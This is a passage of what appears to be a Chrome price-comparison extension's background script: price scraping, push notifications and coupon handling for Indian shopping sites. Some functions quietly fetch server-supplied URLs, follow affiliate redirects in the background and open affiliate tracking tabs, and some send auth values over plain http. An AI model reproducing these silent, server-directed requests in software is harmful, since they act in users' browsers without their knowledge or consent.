  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
      }
    }
  };
  httpq4.send(parameters);
}

function sendPrice(url, price){
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://compare.buyhatke.com/extension/pushPriceData.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&price=" + price + "&url=" + encodeURIComponent(url);
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
      }
    }
  };
  httpq4.send(parameters);
}

function registerEND(website){
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://compare.buyhatke.com/extension/registerEnd.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&website=" + website;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        if(httpq4.responseText!=""){
          openLink(httpq4.responseText);
        }
      }
    }
  };
  httpq4.send(parameters);
}

function sendSavings(price){
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://compare.buyhatke.com/extension/addSavings.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&savings=" + price;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
      }
    }
  };
  httpq4.send(parameters);
}

function checkNotification2(){
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://compare.buyhatke.com/extension/checkNotification.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
        console.log(mytext);
        if(mytext!=""){
          notArray = JSON.parse(mytext);
          if(notArray[0].moreNoti==1 && localStorage.saleMonitor==0){
            window.setTimeout(checkNotification2, 5*1000);
          }
          notify(notArray[0].prod + " Price Drop Alert", "Price of " + notArray[0].prod + " dropped by Rs. " + notArray[0].diff + ". It is now available at Rs. " + notArray[0].cur_price + ". Click me to grab the DEAL !", notArray[0].link, "checkNotification");
        }
      }
    }
  };
  httpq4.send(parameters);
}

suspendRequest = false;

function openLink(myurl){
  var httpq4 = new getXMLHTTPRequest();
  httpq4.open("GET", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
       if(myurl.split("omgpm").length>1){
        var response = httpq4.responseText;
        var target = response.split('window.location.replace("')[1];
        target = target.split('"')[0];
        openLink(target);
      }
    }
  }
};
httpq4.send();
}


function getData(){
  var pollInterval = 1000 * 3600;
  window.setTimeout(getData, pollInterval);
  if(localStorage.saleMonitor==0){
    var httpq4 = new getXMLHTTPRequest();
    var myurl = "http://buyhatke.com/compare/extension/getLink4.php";
    var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
    httpq4.open("POST", myurl, true);
    httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function(){
      if (httpq4.readyState == 4) {
        if(httpq4.status == 200) {
          var httpq5 = new getXMLHTTPRequest();
          var myurl = httpq4.responseText;
          httpq5.open("GET", myurl, true);
  //httpq5.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq5.onreadystatechange = function(){
    if (httpq5.readyState == 4) {
      if(httpq5.status == 200) {
        var mytext = httpq5.responseText;
  //console.log(mytext);
  //sendData(myurl, encodeURIComponent(mytext));
}
}
};
httpq5.send();
}
}
};
httpq4.send(parameters);
}
else {
  console.log("Postponed getData due to Redmi Sale");
}
}



function checkAlertStatus(){
  $s = jQuery.noConflict();
  if(suspendRequest){
    var pollInterval = 1000 * 2400;
  }
  else {
    var pollInterval = 1000 * 2400;
  }
  window.setTimeout(checkAlertStatus, pollInterval);
  if(localStorage.saleMonitor==0){
    var httpq4 = new getXMLHTTPRequest();
    var myurl = "http://buyhatke.com/compare/extension/getLink2.php";
    var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
    httpq4.open("POST", myurl, true);
    httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function(){
      if (httpq4.readyState == 4) {
        if(httpq4.status == 200) {
          var httpq5 = new getXMLHTTPRequest();
          var myurl = httpq4.responseText;
          suspendRequest = true;
          if(myurl!=""){
            suspendRequest = false;
            httpq5.open("GET", myurl, true);
  //httpq5.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq5.onreadystatechange = function(){
    if (httpq5.readyState == 4) {
      if(httpq5.status == 200) {
        var mytext = httpq5.responseText;
        var doc = new DOMParser().parseFromString(mytext, 'text/html');
        if(myurl.split("flipkart").length>1){
          var doc2 = doc.getElementById('fk-mainbody-id');
          var price = $s(doc2).find('meta[itemprop=price]').attr("content").split(",").join("");
        }
        else if(myurl.split("myntra").length>1){
          var doc2 = doc.getElementById('mk-filler');
          var price = $s(doc2).find('meta[itemprop=price]').attr("content").split(",").join("");
          if(price){
            price = price.split(",").join("");
          }
          else {
            var doc2 = doc.getElementsByClassName('summary')[0].getElementsByClassName('price')[0];
            myPrice = doc2.innerHTML;
            myPrice = myPrice.split("Rs.");
            if(myPrice.length>1){
              myPrice = myPrice[1];
            }
            else {
              myPrice = myPrice[0];
            }
            myPrice = myPrice.trim();
            myPrice = myPrice.split(",").join("");
            myPrice = parseFloat(myPrice);
            price = myPrice;
          }
        }
        else if(myurl.split("snapdeal").length>1){
          var doc2 = $s(doc).find('.pdpCatWrapper');
          var price = $s(doc2).find('span[itemprop=price]').html();
        }
        else if(myurl.split("tradus").length>1){
          var doc2 = $s(doc).find('.product-info');
          var price = $s(doc2).find('span[itemprop=lowPrice]').html();
          price = price.trim();
          price = price.split(",").join("");
        }
        else if(myurl.split("yebhi").length>1){
          var doc2 = $s(doc).find('.pdmainbg');
          var price = $s(doc2).find('span[itemprop=price]').html();
          price = price.trim();
          price = price.split(",").join("");
        }
        else if(myurl.split("jabong").length>1){
          var doc2 = $s(doc).find('#content');
          var price = $s(doc2).find('span[itemprop=price]').html();
          price = price.trim();
          price = price.split(",").join("");
        }
        else if(myurl.split("shopclues").length>1){
          var doc2 = $s(doc).find('.price').length;
          var req = doc2 - 1;
          var price = $s(doc).find('.price:eq(' + req + ')').text();
          price = price.trim();
          price = price.split(",").join("");
          price2 = price.split("Rs.");
          if(price2.length>1){
            price = price2[1];
          }
          else {
            price = price2[0]
          }
        }
        else if(myurl.split("homeshop18").length>1){
          var doc2 = $s(doc).find('#productInfoDes');
          var price = $s(doc2).find('span[itemprop=price]').html();
          price = price.trim();
          price = price.split("&nbsp;");
          if(price.length>1){
            price = price[1];
          }
          else {
            price = price[0];
          }
          price = price.split(",").join("");
        }
        else if(myurl.split("croma").length>1){
          var doc2 = $s(doc).find('.product:eq(0)');
          var price = $s(doc2).find('.cta').find('h2').html().trim();
          price = price.split("Rs.")[1];
          price = price.split(",").join("").trim();
        }
        else if(myurl.split("amazon").length>1){

          var doc2 = doc.getElementById('actualPriceValue');
          var price = $s(doc2).text().trim();
          console.log(price);
          if(price==""){
            doc2 = $s(doc).find('.mbcOlpLink:eq(0)');
            price = $s(doc2).text().trim();
            if(price!=""){
              price2 = price.split("Rs.");
              price = price2[1].trim();
              price = price.split(",").join("");
            }
            else {
              doc2 = $s(doc).find('.a-color-price:eq(0)');
              price = $s(doc2).text().trim();
              if(price!=""){
                price2 = price.split("Rs.");
                if(price2.length>1){
                  price = price2[1].trim();
                }
                else {
                 price = price2[0].trim();
               }
               price = price.split(",").join("");
             }
           }
         }
         else {
          price = price.split("Rs.")[1];
          price = price.trim();
          price = price.split(",").join("");
        }
      }
      sendPrice(myurl, price);
    }
  }
};
httpq5.send();
}
}
}
};
httpq4.send(parameters);
}
else {
  console.log("Postponed checkAlertStatus due to Redmi Sale");
}
}


function checkSale(){
  var pollInterval = 1000 * 1200;
  if(localStorage.subscribedFor.split("5").length > 1){
    var pollInterval = 1000 * 5
  }
  window.setTimeout(checkSale, pollInterval);
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "http://search1.buyhatke.com/checkSale.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
        console.log(mytext);
        if(mytext!="" && mytext!= "null"){
          saleArray = JSON.parse(mytext);
          localStorage.saleArray = mytext;
        }
        else {
          localStorage.saleStarted = 0;
          localStorage.saleFinished = 0;
          localStorage.refreshedYet = 0;
          localStorage.mostSensitive = 0;
        }
      }
    }
  };
  httpq4.send(parameters);
}


function applySale(){
  var pollInterval = 1000 * 1;
  if(localStorage.saleStarted == 0){
   pollInterval = 10000;
 }
 var subscribeList = "";
 window.setTimeout(applySale, pollInterval);
  //console.log("applySale was ca;;ed");
  var data = JSON.parse(localStorage.flashSale);
  for(k=0;k<data.length;k++){
   if(data[k].value==1){
    subscribeList = data[k].url;
  }
}
  // var subscribeList = localStorage.subscribedFor;
  if(subscribeList!=""&&data.length>0){
    for(var n=0;n<data.length;n++){
      console.log(n + " " + data[n].value);
      if(data[n].value==1){
        console.log("Time remaining " + localStorage.timeRemaining);
        localStorage.timeRemaining = (data[n].startsAt*1000 - Math.round(+new Date()));
        if((data[n].startsAt*1000 - Math.round(+new Date()) < 900000) && (Math.round(+new Date()) - data[n].startsAt*1000 < 500) && localStorage.saleStarted==0){
          // satisfies from 15 min prior to sale to 3 min later
          localStorage.saleStarted = 1;
          localStorage.refreshedYet = 0;
          localStorage.activeSale = n;
          var newURL = data[n].url;
      //console.log("Had to create a URL");
      chrome.tabs.create({ url: newURL });
      // _gaq.push(["_trackEvent","SEARCH:SALE","Mi Sale"]);
       // start the process
     }
     if((Math.round(+new Date()) - data[n].startsAt*1000 < 330000) && (data[n].startsAt*1000 - Math.round(+new Date())  < 30000) && localStorage.saleStarted==1){
       // satisfies for last 30 s before sale
       localStorage.mostSensitive = 1;
     }
     if((Math.round(+new Date()) - data[n].startsAt*1000 > 1000)){
      localStorage.mostSensitive = 0;
      localStorage.saleStarted = 0;
    }
    if((Math.round(+new Date()) - data[n].startsAt*1000 > 600000)){
      localStorage.saleStarted = 0;
      localStorage.saleFinished = 0;
      localStorage.refreshedYet = 0;
      localStorage.mostSensitive = 0;
      localStorage.activeSale = 0;
      localStorage.timeRemaining = 100000000;
    }
  }
}
}
console.log("Apply sale " + localStorage.timeRemaining);
}

function sendToServer(pushToken){
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://compare.buyhatke.com/extension/regnPush2.php";
  if(pushToken !=""){
    var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&pushToken=" + pushToken;
    httpq4.open("POST", myurl, true);
    httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function(){
      if (httpq4.readyState == 4) {
        if(httpq4.status == 200) {
          var mytext = httpq4.responseText;
          console.log(mytext);
        }
      }
    };
    httpq4.send(parameters);
  }
}

function checkNotification(){
  var pollInterval = 1000 * 2400;
  window.setTimeout(checkNotification, pollInterval);
  if(localStorage.saleMonitor==0){
    var httpq4 = new getXMLHTTPRequest();
    var myurl = "https://compare.buyhatke.com/extension/checkNotification.php";
    var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
    httpq4.open("POST", myurl, true);
    httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function(){
      if (httpq4.readyState == 4) {
        if(httpq4.status == 200) {
          var mytext = httpq4.responseText;
          // console.log(mytext);
          if(mytext!=""){
            notArray = JSON.parse(mytext);
            if(notArray[0].moreNoti==1 && localStorage.saleMonitor ==0){
              window.setTimeout(checkNotification2, 5*1000);
            }
            notify(notArray[0].prod + " Price Drop Alert", "Price of " + notArray[0].prod + " dropped by Rs. " + notArray[0].diff + ". It is now available at Rs. " + notArray[0].cur_price + ". Click me to grab the DEAL !", notArray[0].link, "checkNotification");
          }
        }
      }
    };
    httpq4.send(parameters);
  }
  else {
    console.log("Postponed checkNotification due to Redmi Sale");
  }
}

function checkOtherNotifications(){
  var pollInterval = 1000 * 2400;
  window.setTimeout(checkOtherNotifications, pollInterval);
  if(localStorage.saleMonitor == 0){
    var httpq4 = new getXMLHTTPRequest();
    var myurl = "https://compare.buyhatke.com/extension/sendOtherNotification.php";
    var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
    httpq4.open("POST", myurl, true);
    httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function(){
      if (httpq4.readyState == 4) {
        if(httpq4.status == 200) {
          var mytext = httpq4.responseText;
          // console.log(mytext);
          if(mytext!=""){
            notOtherArray = JSON.parse(mytext);
            notify(notOtherArray[0].title , notOtherArray[0].message, notOtherArray[0].link, "otherNotification");
          }
        }
      }
    };
    httpq4.send(parameters);
  }
  else {
    console.log("Postponed checkOtherNotifications due to Redmi Sale");
  }
}

function getNotificationId() {
  var id = Math.floor(Math.random() * 9007199254740992) + 1;
  return id.toString();
}

function messageReceived(message) {
  var msgReceived = message.data.message;
  console.log("I was called after push" + msgReceived);
  msgReceived = JSON.parse(msgReceived);
  if(typeof(msgReceived[0].nothing) != undefined && typeof(msgReceived[0].nothing) != "undefined" && msgReceived[0].nothing!=null && msgReceived[0].nothing!="null"){
    sendAnalyticsData("testPush-" + msgReceived[0].nothing);
    sendFlag = 0;
    return;
  }
  else if(typeof(msgReceived[0].verifiedExt) != undefined && typeof(msgReceived[0].verifiedExt) != "undefined"){
    // console.log("value received is " + msgReceived[0].verifiedExt);
    localStorage.verifiedExt = msgReceived[0].verifiedExt;
    checkStatus2();
  }
  else if(typeof(msgReceived[0].prod) != undefined && typeof(msgReceived[0].prod) != "undefined"){
    var sendFlag = 1;
    if(typeof(msgReceived[0].notID) != undefined){
     if(localStorage.listNotIDs.split(msgReceived[0].notID).length>1){
      sendFlag = 0;
    }
    else {
      if(typeof(msgReceived[0].notID)!="undefined"){
        localStorage.listNotIDs = localStorage.listNotIDs + "-" + msgReceived[0].notID;
      }
      sendFlag = 1;
    }
  }
  if(sendFlag==1){
    sendAnalyticsData("priceAlertPush");
    notifyPAImage(msgReceived[0].image, msgReceived[0].prod + " Price Drop Alert", "Price dropped by Rs. " + msgReceived[0].diff + ". It is now available at Rs. " + msgReceived[0].cur_price + ". Click me to grab the DEAL !", msgReceived[0].link, "priceAlertPush");
    storeNot(msgReceived[0].image, msgReceived[0].prod + " Price Drop Alert", "Price dropped by Rs. " + msgReceived[0].diff + ". It is now available at Rs. " + msgReceived[0].cur_price + ". Click me to grab the DEAL !", msgReceived[0].link,  msgReceived[0].notID, 1);
  }
}
else {
  var sendFlag = 1;
  if(typeof(msgReceived[0].notID) != undefined){
   if(localStorage.listNotIDs.split(msgReceived[0].notID).length>1){
    sendFlag = 0;
  }
  else {
    if(typeof(msgReceived[0].notID)!="undefined"){
      localStorage.listNotIDs = localStorage.listNotIDs + "-" + msgReceived[0].notID;
    }
    sendFlag = 1;
  }
}
if(sendFlag==1){
  if(typeof(msgReceived[0].luckyWinner) != undefined && typeof(msgReceived[0].luckyWinner) != "undefined"){
    console.log("1 " + msgReceived[0].expiry + " 2 " + Math.floor(Date.now() / 1000));
    if(!msgReceived[0].expiry || msgReceived[0].expiry > Math.floor(Date.now() / 1000)){
      sendAnalyticsData("pushLucky" + msgReceived[0].notID);
      notifyPAImage(msgReceived[0].smallIcon, msgReceived[0].title, msgReceived[0].desc, msgReceived[0].link, "pushLucky" + msgReceived[0].notID);
      return;
      // notifyIcon(msgReceived[0].smallIcon, msgReceived[0].title, msgReceived[0].desc, msgReceived[0].link, "pushImage" + msgReceived[0].notID, "luckyWinner");
    }
    else {
      sendAnalyticsData("pushLucky-Expired" + msgReceived[0].notID);
    }
  }
  else if(msgReceived[0].smallIcon!=""){
    console.log("1 " + msgReceived[0].expiry + " 2 " + Math.floor(Date.now() / 1000));
    if(!msgReceived[0].expiry || msgReceived[0].expiry > Math.floor(Date.now() / 1000)){
      sendAnalyticsData("pushImageIcon" + msgReceived[0].notID);
      notifyIcon(msgReceived[0].smallIcon, msgReceived[0].title, msgReceived[0].desc, msgReceived[0].link, "pushImage" + msgReceived[0].notID, "");
    }
    else {
      sendAnalyticsData("pushImageIcon-Expired" + msgReceived[0].notID);
    }
  }
  else if(msgReceived[0].image!=""){
    console.log("1 " + msgReceived[0].expiry + " 2 " + Math.floor(Date.now() / 1000));
    if(!msgReceived[0].expiry || msgReceived[0].expiry > Math.floor(Date.now() / 1000)){
      sendAnalyticsData("pushImage" + msgReceived[0].notID);
      notifyImage(msgReceived[0].image, msgReceived[0].title, msgReceived[0].desc, msgReceived[0].link, "pushImage" + msgReceived[0].notID);
    }
    else {
      sendAnalyticsData("pushImage-Expired" + msgReceived[0].notID);
    }
  }
  else {
   sendAnalyticsData("pushNormal" + msgReceived[0].notID);
   notify(msgReceived[0].title, msgReceived[0].desc, msgReceived[0].link, "pushNormal" + msgReceived[0].notID);
 }
 storeNot(msgReceived[0].image, msgReceived[0].title,  msgReceived[0].desc , msgReceived[0].link, msgReceived[0].notID, 0);
}
}
}

chrome.gcm.onMessage.addListener(messageReceived);
chrome.notifications.onClicked.addListener(function(notifID){
 chrome.notifications.clear(notifID, function(){
 });
 if(hashPushName[notifID]){
   sendAnalyticsData("clicked-" + hashPushName[notifID]);
 }
 else {
   sendAnalyticsData("clicked-push-notification");
 }
});

chrome.notifications.onButtonClicked.addListener(function(notifID,buttonIndex){
 if(hashPushLink[notifID] && buttonIndex==0){
   targetURL = hashPushLink[notifID];
   sendAnalyticsData("button-clicked-" + hashPushName[notifID]);
 }
 else if(buttonIndex==1){
   targetURL = "https://compare.buyhatke.com/options/";
   sendAnalyticsData("button-unsubscribed-" + hashPushName[notifID]);
 }
 else {
  targetURL ="";
}
if(targetURL!=""){
  chrome.tabs.create({
    url: targetURL
  });
}
else {
 sendAnalyticsData("button-error-" + hashPushName[notifID]);

}
chrome.notifications.clear(notifID, function(){
});
});

chrome.notifications.onClosed.addListener(function(notifID){
 if(hashPushName[notifID]){
   sendAnalyticsData("closed-" + hashPushName[notifID]);
 }
 else {
   sendAnalyticsData("closed-push-notification");
 }
});

function removeWatch(num){
  link_id = num;
  ext_id = localStorage.ext_id;
  var httpq2 = getXMLHTTPRequest();
  var myurl = "https://compare.buyhatke.com/extension/removeFromWatchList.php";
  var parameters = "link_id=" + (link_id) + "&ext_id=" + ext_id + "&auth_val=" + localStorage.ext_auth;
  httpq2.open("POST", myurl, true);
  httpq2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq2.onreadystatechange = function(){
    if (httpq2.readyState == 4) {
      if(httpq2.status == 200) {
        var mytext = httpq2.responseText;
        watchListArray = JSON.parse(mytext);
      }
    }
  };
  httpq2.send(parameters);
}

function closeIT(tabID){
      var someID = tabID;
      chrome.tabs.onUpdated.addListener(function(someID, info) {
    if (info.status == "complete") {
             //chrome.tabs.remove(someID, function() { });
        }
    });
}

function getAffCoupons(coupIndex, tabID){
  if(coupIndex == 2){
    chrome.tabs.create({
     url : "https://tracking.buyhatke.com/Navigation/?pos=111&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("https://www.myntra.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 1){
    chrome.tabs.create({
     url : "https://tracking.buyhatke.com/Navigation/?pos=50&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.jabong.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 34){
    chrome.tabs.create({
     url : "https://tracking.buyhatke.com/Navigation/?pos=22&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.koovs.com")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 2190){
    chrome.tabs.create({
     url : "https://tracking.buyhatke.com/Navigation/?pos=2190&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("https://www.tatacliq.com")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 222222){
    chrome.tabs.create({
     url : "https://tracking.buyhatke.com/Navigation/?pos=2&source=extension&ext1=mainWebsite-banner&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("https://www.flipkart.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 1829){
    chrome.tabs.create({
     url : "https://tracking.buyhatke.com/Navigation/?pos=1829&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("https://in.bookmyshow.com")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 3){
    chrome.tabs.create({
     url : "https://tracking.buyhatke.com/Navigation/?pos=129&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.snapdeal.com/?utm_source=aff_prog")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 4){
    chrome.tabs.create({
     url : "https://tracking.buyhatke.com/Navigation/?pos=1&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.ebay.in/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 7){
    chrome.tabs.create({
     url : "https://tracking.buyhatke.com/Navigation/?pos=421&source=extension&ext1=pushA&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.shopclues.com/appliances-5/breakfast-appliances-offers.html?utm_medium=notification")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 10){
    chrome.tabs.create({
     url : "https://tracking.buyhatke.com/Navigation/?pos=99&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.infibeam.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 11){ //MMT
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=1288&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("https://www.makemytrip.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 8){
   //  chrome.tabs.create({
   //   url : "http://track.in.omgpm.com/?AID=368059&PID=11256&CID=3954200&MID=387804&r=http://shopping.indiatimes.com/"
   // }, function(tabData){
   //    var someID = tabData.id;
   //    closeIT(someID);
   // });
  }
  else if(coupIndex == 9){
    chrome.tabs.create({
     url : "https://tracking.buyhatke.com/Navigation/?pos=4&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link="  + encodeURIComponent("http://www.homeshop18.com/?it_category=AP&it_action=WB-HSLOGO&it_label=AP-HSLOGO-140609131400-PR-WB-OT-MR-HS18_HomeShop18Logo&it_value=0")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 14 || coupIndex == 29){
    chrome.tabs.create({
     url : "https://tracking.buyhatke.com/Navigation/?pos=1331&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link="  + encodeURIComponent("https://paytm.com/?utm_source=affiliates&utm_medium=buyhatke&utm_campaign=buyhatke-generic")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 15){ // Foodpanda
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=1349&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=http%3A%2F%2Fwww.foodpanda.in"
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 16){
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=1352&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=http%3A%2F%2Fwww.dominos.co.in"
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 17){
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=1293&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.yatra.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 18){
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?tagType=" + localStorage.setTagType + "&pos=63&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.amazon.in/?tag=buyhatke-21")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 19){
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=1000&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.fabfurnish.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 20){
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=57&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.lenskart.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 22){
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=425&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://zovi.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 24){
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=333&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("https://www.pepperfry.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 26){
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=429&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.zivame.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 27){ //Trendin
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=431&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.trendin.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 28){
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=426&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.bluestone.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 30){ //Healthkart
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=921&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("https://www.healthkart.com")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  else if(coupIndex == 32){ // Justeat
   //  chrome.tabs.create({
   //   url : "http://tracking.buyhatke.com/Navigation/?pos=921&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("https://www.healthkart.com")
   // });
 }
  else if(coupIndex == 40){ // Prettysecrets
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=433&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://prettysecrets.com/")
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
  }
  chrome.tabs.update(parseInt(tabID), {selected: true});
  getAddCouponsData(coupIndex);
}

function getAddCouponsData(coupons){
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "http://coupons.buyhatke.com/PickCoupon/FreshCoupon/getAutoCoupons.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&flag=1&pos=" + coupons;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
      }
    }
  };
  httpq4.send(parameters);
}

function reportSuccess(timeVal){
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "http://buyhatke.com/compare/extension/reportSuccess.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&respTime=" + timeVal;
  httpq4.open("POST", myurl, true);
